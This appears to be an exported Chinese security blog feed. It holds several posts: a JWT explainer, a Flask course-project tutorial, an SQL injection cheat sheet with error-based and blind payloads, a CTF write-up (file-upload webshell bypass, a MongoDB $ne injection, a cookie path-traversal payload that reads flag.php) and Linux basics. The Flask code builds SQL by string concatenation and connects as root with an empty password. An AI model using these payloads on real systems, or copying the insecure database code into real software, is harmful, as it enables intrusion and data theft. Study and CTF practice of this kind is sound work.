<p><code>alg</code>参数的值可以是<a href="https://tools.ietf.org/html/rfc7518#section-3.1">JSON网络算法</a>(JWA)中的任意指定值 - 这是我所知道的另一个规范。<br><code>typ</code>参数，如果它是已知的，那么它就是 JWT，因为应用不会去索取其他的值，如果这个参数没有值就会被忽视掉。因此它是可选的。如果需要被指定值，它应该按大写字母拼写 - JWT 。<br><code>kid</code>参数是基于安全原因使用的。<code>cty</code>参数参数在另一方面应该只被用于处理嵌套的JWT<br>其他参数请参照<a href="https://tools.ietf.org/html/rfc7515#section-4.1">手册</a></p>
<h4 id="载荷-payload"><a href="#载荷-payload" class="headerlink" title="载荷(payload)"></a>载荷(payload)</h4><p>payload是由类似格式json结构生成的，payload的json结构并不像header那么简单，payload用来承载要传递的数据，它的json结构实际上是对JWT要传递的数据的一组声明，这些声明被JWT标准称为claims，它的一个“属性值对”其实就是一个claim，每一个claim的都代表特定的含义和作用。</p>
<p>包括如下参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sub: 该JWT所面向的用户</span><br><span class="line">iss: 该JWT的签发者</span><br><span class="line">iat(issued at): 在什么时候签发的token</span><br><span class="line">exp(expires): token什么时候过期</span><br><span class="line">nbf(not before)：token在此时间之前不能被接收处理</span><br><span class="line">jti：JWT ID为web token提供唯一标识</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">base64编码：eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></table></figure>
<h4 id="签名-signature"><a href="#签名-signature" class="headerlink" title="签名(signature)"></a>签名(signature)</h4><p>签名是把header和payload对应的json结构进行base64url编码之后得到的两个串用英文句点号拼接起来，然后根据header里面alg指定的签名算法生成出来的,在加密的时候，我们还需要提供一个密钥（secret）。<br>最后我们将这一部分签名也拼接在被签名的字符串后面，我们就得到了完整的JWT：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signature：TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br><span class="line">JWT：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>我将自己获取的jwt，header和payload通过base64解码出来…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;sha256&quot;,&quot;kid&quot;:&quot;8801&quot;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;camser&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>我们得知sign部门的加密算法是sha256，kid：8801，我们只要得到admin的将加密密钥，就可以构造出admin的JWT，然后伪造登陆…,如下浏览器上传jwt。<br><img src="/uploads/quan4.jpg" alt="1"></p>
<p>最后该题并不是如此思路，所以我并没有成功。其实题目很简单，admin是空密码，但是他设置有默认密码，正常登陆你是不能密码为空的，所有通过hackbar等小工具，才能时间空密码的登陆。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Flask的教务管理系统的开发</title>
    <url>/2018/09/20/%E5%9F%BA%E4%BA%8EFlask%E7%9A%84%E6%95%99%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<h1 id="基于Flask的教务管理系统的开发"><a href="#基于Flask的教务管理系统的开发" class="headerlink" title="基于Flask的教务管理系统的开发"></a>基于Flask的教务管理系统的开发</h1><h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>不知不觉已经来到了大四学年，苦逼的我们，大四还有很多的课.近期用一周的时间，把课设-管理系统简单的做了一下(毕竟复杂的也不会…)<br>用了Python的一个框架Flask进行开发，之前虽然会python，但是并没有接触过python的web开发，也是边学边做，遂写下该文已记录学习的过程.</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>开发语言这里用的是python3，我是直接把用到的依赖库pip到了我的python3环境中，<br>一般网上的教程，好多都是使用了虚拟环境venv，可以自行百度。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我用到的依赖库</span><br><span class="line"></span><br><span class="line"># 导入Flask库</span><br><span class="line">from flask import Flask, flash, render_template</span><br><span class="line">from flask import request, session, g, redirect, url_for, abort</span><br><span class="line"># 导入MySQL库</span><br><span class="line">import pymysql</span><br></pre></td></tr></table></figure>
<p>数据库用的mysql，同样是按照网上的教程配置好mysql。</p>
<h2 id="框架结构"><a href="#框架结构" class="headerlink" title="框架结构"></a>框架结构</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>所有 Flask 程序都必须创建一个程序实例。Web 服务器使用一种名为 Web 服务器网关接口<br>（Web Server Gateway Interface，WSGI）的协议，把接收自客户端的所有请求都转交给这<br>个对象处理。程序实例是 Flask 类的对象，经常使用下述代码创建：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">app &#x3D; Flask(__name__)</span><br></pre></td></tr></table></figure>
<p>Flask 类的构造函数只有一个必须指定的参数，即程序主模块或包的名字。在大多数程序<br>中，Python 的 <strong>name</strong> 变量就是所需的值。</p>
<h3 id="路由和视图函数"><a href="#路由和视图函数" class="headerlink" title="路由和视图函数"></a>路由和视图函数</h3><p>客户端把请求发送给 Web 服务器，Web 服务器再把请求发送给 Flask程序实例。<br>程序实例需要知道对每个 URL 请求运行哪些代码，所以保存了一个 URL 到<br>Python 函数的映射关系。处理 URL 和函数之间关系的程序称为路由。</p>
<p>在 Flask 程序中定义路由的最简便方式，是使用程序实例提供的 app.route 修饰器，把修<br>饰的函数注册为路由。下面的例子说明了如何使用这个修饰器声明路由：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;index&#39;)</span><br><span class="line">def index():</span><br><span class="line">return &#39;&lt;h1&gt;Hello World!&lt;&#x2F;h1&gt;&#39;</span><br></pre></td></tr></table></figure>
<p>修饰器是 Python 语言的标准特性，可以使用不同的方式修改函数的行为。惯<br>常用法是使用修饰器把函数注册为事件的处理程序。</p>
<p>上面的代码实现的功能是，当我们访问<a href="http://www.example.com,编根据路由找到index()函数,该函数执行并响应,客户端接收到内容./">www.example.com,编根据路由找到index()函数，该函数执行并响应，客户端接收到内容。</a></p>
<p>像 index() 这样的函数称为视图函数（view function）。视图函数返回的响应可以是包含<br>HTML 的简单字符串，也可以是复杂的表单。</p>
<h3 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h3><p>程序实例用 run 方法启动 Flask 集成的开发 Web 服务器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">app.run(debug&#x3D;True)</span><br></pre></td></tr></table></figure>
<p>##数据库操作</p>
<h3 id="内容显示"><a href="#内容显示" class="headerlink" title="内容显示"></a>内容显示</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">后端：</span><br><span class="line">def get_Table_Data(table):</span><br><span class="line">    conn &#x3D; pymysql.connect(</span><br><span class="line">        host&#x3D;&#39;127.0.0.1&#39;, port&#x3D;3306,</span><br><span class="line">        user&#x3D;&#39;root&#39;, passwd&#x3D;&#39;&#39;,</span><br><span class="line">        db&#x3D;&#39;csp&#39;, charset&#x3D;&#39;utf8&#39;,</span><br><span class="line">        )</span><br><span class="line">    cur &#x3D; conn.cursor()</span><br><span class="line">    res &#x3D; cur.execute(&quot;select * from &quot; + table) #返回匹配数据的个数</span><br><span class="line">    res &#x3D; cur.fetchmany(res) #获取所有匹配的数据</span><br><span class="line">    cur.close()</span><br><span class="line">    conn.commit()</span><br><span class="line">    conn.close()</span><br><span class="line">    return res</span><br><span class="line">def jxjh():</span><br><span class="line">	data &#x3D; get_Table_Data(&#39;jihuaxijie&#39;)</span><br><span class="line">	posts &#x3D; []</span><br><span class="line">    for value in data:</span><br><span class="line">        dict_data &#x3D; &#123;&#125;</span><br><span class="line">        dict_data[&#39;a&#39;] &#x3D; value[0]</span><br><span class="line">        dict_data[&#39;b&#39;] &#x3D; value[1]</span><br><span class="line">        dict_data[&#39;c&#39;] &#x3D; value[2]</span><br><span class="line">        posts.append(dict_data)</span><br><span class="line">    return render_template(&#39;teacher.html&#39;, posts&#x3D;posts)</span><br><span class="line">前端：</span><br><span class="line">&#123;% for post in posts %&#125;</span><br><span class="line"> &lt;tr&gt;</span><br><span class="line">     </span><br><span class="line">     &lt;td&gt;&#123;&#123;post.a&#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">     &lt;td&gt;&#123;&#123;post.b&#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">     &lt;td&gt;&#123;&#123;post.c&#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">     &lt;td&gt;&#123;&#123;post.d&#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">     &lt;td&gt;&#123;&#123;post.e&#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">     </span><br><span class="line"> &lt;&#x2F;tr&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p>这里用到了对数据库操作的库pymysql，首先是一个数据库的配置和连接，然后获取到全部数据，<br>这里有一个操作，后端获取到的数据传到前端，用到了<code>render_template(&#39;teacher.html&#39;, posts=posts)</code>,返回到teacher.html界面，并将posts数据传至前端使用。</p>
<p>前端可以直接使用来显示传过来的数据。</p>
<h3 id="删除、查询、修改"><a href="#删除、查询、修改" class="headerlink" title="删除、查询、修改"></a>删除、查询、修改</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db &#x3D; connect_db()</span><br><span class="line">cur &#x3D; db.cursor()</span><br><span class="line">sql &#x3D; &#39;delete from xueshengchengji where course_name &#x3D; %s&#39; #删除</span><br><span class="line">sql1&#x3D;&#39;select * from xueshengchengji where course_name &#x3D; %s&#39; #查询</span><br><span class="line">sql2 &#x3D; &#39;update user set password&#x3D;%s where username&#x3D;%s&#39; #修改</span><br><span class="line">cur.execute(sql,(request.form[&#39;aaa&#39;]))</span><br><span class="line">db.commit()</span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure>
<p>同样是连接数据库，构造sql语句，进行相应的操作，这里需要前端post表单数据，后端获取<code>request.form[&#39;aaa&#39;]</code>,然后才能执行。</p>
<h2 id="session验证"><a href="#session验证" class="headerlink" title="session验证"></a>session验证</h2><p>为了保证身份验证，权限管理，我加入session验证。<br>这样可以避免未登录状态可以直接通过url路径访问页面，也防止了学生越权访问教师的界面。</p>
<p>1.登陆成功，创建session<br>session[‘logged_th’] = request.form[‘username’]</p>
<p>2.页面访问验证session<br>if not session.get(‘logged_st’):<br>    flash(‘请先登录，再访问页面…’)<br>    return redirect(url_for(‘login’))</p>
<p>3.登出或修改密码，删除session，返回登录界面<br> session.pop(‘logged_st’,None)<br> return render_template(‘login.html’)</p>
<h2 id="界面演示"><a href="#界面演示" class="headerlink" title="界面演示"></a>界面演示</h2><p><img src="/uploads/flask1.png" alt="1"><br><img src="/uploads/flask2.png" alt="1"><br><img src="/uploads/flask3.png" alt="1"><br><img src="/uploads/flask4.png" alt="1"><br><img src="/uploads/flask5.png" alt="1"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>夯实基础之sql注入篇</title>
    <url>/2018/08/05/%E5%A4%AF%E5%AE%9E%E5%9F%BA%E7%A1%80%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
    <content><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
<h2 id="mysql注入"><a href="#mysql注入" class="headerlink" title="mysql注入"></a>mysql注入</h2><h3 id="mysql基本命令学习"><a href="#mysql基本命令学习" class="headerlink" title="mysql基本命令学习"></a>mysql基本命令学习</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT MID(column_name,start[,length]) FROM table_name;</span><br><span class="line"></span><br><span class="line">例:select mid(user,2,2) from users;</span><br><span class="line">users表中的user字段中，起始位置为2，返回两个字符</span><br></pre></td></tr></table></figure>
<p><img src="/uploads/sqllearn1.png" alt="1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from table limit m,n;</span><br><span class="line"></span><br><span class="line">例:select * from users limit 0,2;</span><br><span class="line">users中，起始位置为第一行(0),返回两行数据。</span><br></pre></td></tr></table></figure>
<p><img src="/uploads/sqllearn2.png" alt="1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">concat:MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL.</span><br><span class="line">concat_ws:concat_ws函数在执行的时候,不会因为NULL值而返回NULL,根据第一个字符将后面的字符串接起来.</span><br><span class="line">group_concat:group_concat( [distinct] 要连接的字段 [order by 排序字段 asc&#x2F;desc ] [separator &#39;分隔符&#39;] )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/uploads/sqllearn3.png" alt="1"><br><img src="/uploads/sqllearn4.png" alt="1"><br><img src="/uploads/sqllearn5.png" alt="1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*) from users</span><br><span class="line">count()聚合函数，统计users表中行数</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select rand();</span><br><span class="line">产生一个0~1的随机数</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select floor(123.456)</span><br><span class="line">向下取整，得123</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users group by user;</span><br><span class="line">按照user进行分组</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/uploads/sqllearn6.png" alt="1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select length(&#39;hello&#39;);</span><br><span class="line">返回字符串长度，如上返回5.</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select substr(&#39;abcd&#39;,2,3);</span><br><span class="line">截取字符串 三个参数 （所要截取字符串，截取的位置，截取的长度）,如上返回bcd.</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ascii(&#39;a&#39;)</span><br><span class="line">返回字符串ascii，如上返回97.</span><br></pre></td></tr></table></figure>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</span><br><span class="line"></span><br><span class="line">此处有三个点，一是需要 concat 计数，二是 floor，取得 0 or 1，进行数据的</span><br><span class="line">重复，三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时</span><br><span class="line">重复造成的错误。也有解释为 mysql 的 bug 的问题。但是此处需要将 rand(0)，rand()需</span><br><span class="line">要多试几次才行。</span><br><span class="line"></span><br><span class="line">以上语句可以简化成如下的形式。</span><br><span class="line">select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</span><br><span class="line">如果关键的表被禁用了，可以使用这种形式</span><br><span class="line">select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2))</span><br><span class="line">如果 rand 被禁用了可以使用用户变量来报错</span><br><span class="line">select min(@a:&#x3D;1) from information_schema.tables group by concat(password,@a:&#x3D;(@a+1)%2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="exp报错注入"><a href="#exp报错注入" class="headerlink" title="exp报错注入"></a>exp报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">elect exp(~(select * FROM(SELECT USER())a)) &#x2F;&#x2F;double 数值类型超出范围</span><br><span class="line">&#x2F;&#x2F;Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上</span><br></pre></td></tr></table></figure>
<h4 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select @@version),0x7e)) &#x2F;&#x2F;mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">select extractvalue(1, concat(0x5c,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1)));</span><br><span class="line"></span><br><span class="line">获取字段</span><br><span class="line">select extractvalue(1, concat(0x5c,(select password from users limit 1,1)));ERROR 1105 (HY000): XPATH syntax error: &#39;\I-kill-you&#39;mysql&gt; select extractvalue(1, concat(0x5c,(select password from users limit 0,1)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select @@version),0x7e),1) &#x2F;&#x2F;mysql对xml数据进行查询和修改的 xpath 函数，xpath 语法错误</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">select updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema&#x3D;database() limit 3,1)),0);</span><br><span class="line"></span><br><span class="line">获取字段</span><br><span class="line">select updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name&#x3D;&#39;users&#39; limit 4,1)),0);</span><br><span class="line"></span><br><span class="line">获取内容</span><br><span class="line">select updatexml(0,concat(0x7e,(SELECT concat(password) FROM users limit 0,1)),0);ERROR 1105 (HY000): XPATH syntax error: &#39;~Dumb&#39;mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(password) FROM users limit 1,1)),0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="基于布尔sql盲注"><a href="#基于布尔sql盲注" class="headerlink" title="基于布尔sql盲注"></a>基于布尔sql盲注</h3><p>通过构造sql语句，通过判断语句是否执行成功来对数据进行猜解。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">left(database(),1)&gt;’s’ &#x2F;&#x2F;left()函数</span><br><span class="line">Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</span><br><span class="line"></span><br><span class="line">ascii(substr((select table_name information_schema.tables where tables_schema&#x3D;database()limit 0,1),1,1))&#x3D;101 --+ </span><br><span class="line">Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换为 ascii 值</span><br><span class="line"></span><br><span class="line">ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&gt;98%23 &#x2F;&#x2F;ord()函数，mid()函数</span><br><span class="line">Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位,Ord()函数同 ascii()，将字符转为 ascii 值</span><br><span class="line"></span><br><span class="line">regexp 正则注入</span><br><span class="line">用法介绍：select user() regexp &#39;^[a-z]&#39;;</span><br><span class="line">Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。</span><br><span class="line">第二位可以用 select user() regexp &#39;^ro&#39;来进行。</span><br></pre></td></tr></table></figure>
<h3 id="基于时间盲注"><a href="#基于时间盲注" class="headerlink" title="基于时间盲注"></a>基于时间盲注</h3><p>当对数据库进行查询操作，如果查询的条件不存在，语句执行的时间便是0.但往往语句执行的速度非常快，线程信息一闪而过，得到的执行时间基本为0。但是如果查询语句的条件不存在，执行的时间便是0，利用该函数这样一个特殊的性质，可以利用时间延迟来判断我们查询的是否存在。这便是SQL基于时间延迟的盲注的工作原理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 &#x2F;&#x2F;if 判断语句，条件为假，</span><br><span class="line">执行 sleep</span><br><span class="line">Ps： 遇到以下这种利用 sleep()延时注入语句</span><br><span class="line">select sleep(find_in_set(mid(@@version, 1, 1), &#39;0,1,2,3,4,5,6,7,8,9,.&#39;));</span><br><span class="line">该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</span><br><span class="line"></span><br><span class="line">union select if(substring(current,1,1)&#x3D;char(119),benchmark(5000000,encode(‘msg’,’by 5 seconds’)),null) from (select database() as current) as tb1;</span><br><span class="line">&#x2F;&#x2F;BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 sleep()函数进行注入。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>安恒月赛web篇</title>
    <url>/2018/06/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9Bweb%E7%AF%87/</url>
    <content><![CDATA[<h1 id="安恒月赛"><a href="#安恒月赛" class="headerlink" title="安恒月赛"></a>安恒月赛</h1><p>好久没有更新博客了…<br>最近一直在忙于找实习,果然还是太弱了啊，实习都找不到(ಥ﹏ಥ)</p>
<h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p>本题是一个中规中矩的文件上传漏洞.</p>
<p>打开题目链接，我们先上传一个图片文件.上传成功，回显图片的路径.<br><img src="/uploads/ah1.png" alt="1"></p>
<p>继续上传一个php文件，便发现提示It is not a image,上传失败.</p>
<p>我们抓包分析一下，修改Content-Type: image/jpeg，和文件后缀，还是不能上传php文件.</p>
<p>想到还有一种检测文件的方法，那就是文件头标志.</p>
<p>于是我上传了一个图片木马，即php木马隐藏在图片中,抓包，修改文件后缀名,上传成功，但是文件后缀名被改为peg<br><img src="/uploads/ah2.png" alt="1"><br><img src="/uploads/ah3.png" alt="1"></p>
<p>经过一番测试，发现它是自动将文件的三位后缀名替换为peg.<br>我们将文件名改成mu.jpg.php,上传成功，网站打开发现，解析成功.<br><img src="/uploads/ah4.png" alt="1"></p>
<p>连接菜刀，拿到flag.<br><img src="/uploads/ah5.png" alt="1"></p>
<h2 id="研究生的秘密"><a href="#研究生的秘密" class="headerlink" title="研究生的秘密"></a>研究生的秘密</h2><p>该题目考的是一个MongoDB注入.<br>可以参考这篇<a href="http://www.freebuf.com/articles/database/95314.html">文章</a></p>
<p>打开题目链接，可以看到一些其他的链接选项，但是直接点击并不能进行跳转.<br><img src="/uploads/ah6.png" alt="1"></p>
<p>我们通过右击，新建标签页打开链接.<br><img src="/uploads/ah7.png" alt="1"></p>
<h3 id="MongoDB知识点"><a href="#MongoDB知识点" class="headerlink" title="MongoDB知识点"></a>MongoDB知识点</h3><p>条件操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gt : &gt;</span><br><span class="line">$lt : &lt;</span><br><span class="line">$gte: &gt;&#x3D;</span><br><span class="line">$lte: &lt;&#x3D;</span><br><span class="line">$ne : !&#x3D;、&lt;&gt;</span><br><span class="line">$in : in</span><br><span class="line">$nin: not in</span><br><span class="line">$all: all </span><br><span class="line">$or:or</span><br><span class="line">$not: 反匹配(1.3.3及以上版本)</span><br><span class="line">模糊查询用正则式：db.customer.find(&#123;&#39;name&#39;: &#123;&#39;$regex&#39;:&#39;.*s.*&#39;&#125; &#125;)</span><br><span class="line">&#x2F;**</span><br><span class="line">* : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;</span><br><span class="line">* : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;</span><br><span class="line">* : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;查询age &#x3D; 22的记录</span><br><span class="line">db.userInfo.find(&#123;&quot;age&quot;: 22&#125;);</span><br><span class="line">&#x2F;&#x2F;相当于：select * from userInfo where age &#x3D; 22;</span><br><span class="line">&#x2F;&#x2F;查询age &gt; 22的记录</span><br><span class="line">db.userInfo.find(&#123;age: &#123;$gt: 22&#125;&#125;);</span><br><span class="line">&#x2F;&#x2F;相当于：select * from userInfo where age &gt; 22;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>就PHP本身的性质而言，由于其松散的数组特性，导致如果我们输入value=A那么，也就是输入了一个value的值为1的数据。如果输入value[$ne]=2也就意味着value=array($ne=&gt;2),在MongoDB的角度来，很有可能从原来的一个单个目标的查询变成了条件查询（$ne表示不等于-not equel）：</p>
<p>那么我们构造<code>http://101.71.29.5:10002/index.php?title[$ne]=1</code>,使其变成了一个title！=1的条件查询.<br>拿到flag.<br><img src="/uploads/ah8.png" alt="1"></p>
<h2 id="Mynote"><a href="#Mynote" class="headerlink" title="Mynote"></a>Mynote</h2><p>该题目按照正常解法是个不太好的题目，但是按非预期解是一个不错的题目。</p>
<p>打开题目链接，是一个类似于博客系统的网站，有用户的注册登录，留言，图片上传.</p>
<p>尝试了一下留言，是存在xss漏洞的，但是不太会利用.</p>
<p>于是继续尝试文件上传，这次我直接上传我的图片马，哎嘿，直接成功了，但是没有路径显示，所以也无法利用.</p>
<p>仔细查看一些点，发现了cookie中的picture，进行base64解码，解得是我们上传的文件的json格式。</p>
<p><img src="/uploads/ah9.png" alt="1"></p>
<p>我们继续抓取图片显示的页面,发现如下源码，进行base64解码，是文件的源码.这是思路就比较清晰了，我们可以构造cookie，然后可以拿到文件的源码.<br><img src="/uploads/ah10.png" alt="1"></p>
<p>无意中的打错了文件名，结果报错，显示了上传文件存储的路径,这是我们也可以直接访问该路径了，不过我连接菜刀失败了，可以被限制了吧.<br><img src="/uploads/ah11.png" alt="1"></p>
<p>当我们访问<a href="http://101.71.29.5:10000/robots.txt%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E4%B8%80%E4%BA%9B%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8C%85%E5%90%AB%E6%9C%89flag.php,%E4%BD%86%E6%98%AF%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%E6%98%AF%E4%B8%AA%E5%81%87%E7%9A%84flag%E3%80%82">http://101.71.29.5:10000/robots.txt，可以看到一些文件，包含有flag.php,但是直接访问是个假的flag。</a><br><img src="/uploads/ah12.png" alt="1"></p>
<p>这是我们构造<code>a:1:&#123;i:0;s:14:&quot;../../flag.php&quot;;&#125;</code>base64编码后替换为cookie.提交页面，得到一串base64码，解码后是flag.php的源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag &#x3D; &quot;flag&#123;N4me_sPac4_Is_Int3r3st1ng&#125;&quot;;</span><br><span class="line">echo &quot;flag&#123;This_1S_A_F4ke_f1aG&#125;&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>每日Linux命令</title>
    <url>/2018/05/11/%E6%AF%8F%E6%97%A5Linux%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="Linux基本命令"><a href="#Linux基本命令" class="headerlink" title="Linux基本命令"></a>Linux基本命令</h1><h2 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h2><p>ifconfig这个是最最基本的命令啦，一般就和windows命令的ipconfig一样，查一下I相关的网络参数地址.</p>
<h2 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h2><p>这个命令和windows的cd一样切换目录.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;Docements # 切换到目录&#x2F;root&#x2F;Docements  </span><br><span class="line">cd .&#x2F;path          # 切换到当前目录下的path目录中，“.”表示当前目录    </span><br><span class="line">cd ..&#x2F;path         # 切换到上层目录中的path目录中，“..”表示上一层目录  </span><br></pre></td></tr></table></figure>
<h2 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h2><p>该命令用于查看当前目录下的所有文件，有list之意.</p>
